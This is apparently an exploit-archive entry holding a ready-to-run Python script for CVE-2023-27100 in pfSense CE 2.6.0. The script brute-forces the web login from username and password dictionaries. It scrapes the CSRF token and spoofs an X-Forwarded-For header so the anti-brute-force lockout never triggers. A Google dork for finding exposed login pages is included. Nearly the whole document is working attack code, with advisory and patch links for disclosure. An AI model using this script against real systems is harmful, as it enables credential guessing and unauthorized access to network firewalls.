@@ -1,0 +1,103 @@
+id: 38572
+date: 04/10/2023
+title: pfsenseCE v2.6.0 - Anti-brute force protection bypass Exploit
+author: FabDotNET
+cves: CVE-2023-27100
+
+#!/usr/bin/python3
+
+## Exploit Title: pfsenseCE v2.6.0 - Anti-brute force protection bypass
+## Google Dork: intitle:"pfSense - Login"
+## Date: 2023-04-07
+## Exploit Author: FabDotNET (Fabien MAISONNETTE)
+## Vendor Homepage: https://www.pfsense.org/
+## Software Link: https://atxfiles.netgate.com/mirror/downloads/pfSense-CE-2.6.0-RELEASE-amd64.iso.gz
+## Version: pfSenseCE <= 2.6.0
+## CVE: CVE-2023-27100
+
+# Vulnerability
+## CVE: CVE-2023-27100
+## CVE URL: https://nvd.nist.gov/vuln/detail/CVE-2023-27100
+## Security Advisory: https://docs.netgate.com/downloads/pfSense-SA-23_05.sshguard.asc
+## Patch: https://redmine.pfsense.org/projects/pfsense/repository/1/revisions/9633ec324eada0b870962d3682d264be577edc66
+
+import requests
+import sys
+import re
+import argparse
+import textwrap
+from urllib3.exceptions import InsecureRequestWarning
+
+# Expected Arguments
+parser = argparse.ArgumentParser(description="pfsenseCE <= 2.6.0 Anti-brute force protection bypass",
+                                 formatter_class=argparse.RawTextHelpFormatter,
+                                 epilog=textwrap.dedent(''' 
+Exploit Usage : 
+./CVE-2023-27100.py -l http://<pfSense>/ -u user.txt -p pass.txt
+./CVE-2023-27100.py -l http://<pfSense>/ -u /Directory/user.txt -p /Directory/pass.txt'''))
+
+parser.add_argument("-l", "--url", help="pfSense WebServer (Example: http://127.0.0.1/)")
+parser.add_argument("-u", "--usersList", help="Username Dictionary")
+parser.add_argument("-p", "--passwdList", help="Password Dictionary")
+args = parser.parse_args()
+
+if len(sys.argv) < 2:
+    print(f"Exploit Usage: ./CVE-2023-27100.py -h [help] -l [url] -u [user.txt] -p [pass.txt]")
+    sys.exit(1)
+
+# Variable
+url = args.url
+usersList = args.usersList
+passwdList = args.passwdList
+
+# Suppress only the single warning from urllib3 needed.
+if url.upper().startswith("HTTPS://"):
+    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+print('pfsenseCE <= 2.6.0 Anti-brute force protection bypass')
+
+
+def login(userlogin, userpasswd):
+    session = requests.session()
+    r = session.get(url, verify=False)
+
+    # Getting CSRF token value
+    csrftoken = re.search(r'input type=\'hidden\' name=\'__csrf_magic\' value="(.*?)"', r.text)
+    csrftoken = csrftoken.group(1)
+
+    # Specifying Headers Value
+    headerscontent = {
+        'User-Agent': 'Mozilla/5.0',
+        'Referer': f"{url}",
+        'X-Forwarded-For': '42.42.42.42'
+    }
+
+    # POST REQ data
+    postreqcontent = {
+        '__csrf_magic': f"{csrftoken}",
+        'usernamefld': f"{userlogin}",
+        'passwordfld': f"{userpasswd}",
+        'login': 'Sign+In'
+    }
+
+    # Sending POST REQ
+    r = session.post(url, data=postreqcontent, headers=headerscontent, allow_redirects=False, verify=False)
+
+    # Conditional loops
+    if r.status_code != 200:
+        print(f'[*] - Found Valid Credential !!')
+        print(f"[*] - Use this Credential -> {userlogin}:{userpasswd}")
+        sys.exit(0)
+
+
+# Reading User.txt & Pass.txt files
+userfile = open(usersList).readlines()
+passfile = open(passwdList).readlines()
+
+for user in userfile:
+    user = user.strip()
+    for passwd in passfile:
+        passwd = passwd.strip()
+        login(user, passwd)
+
+#  0day.today [2023-04-19]  #
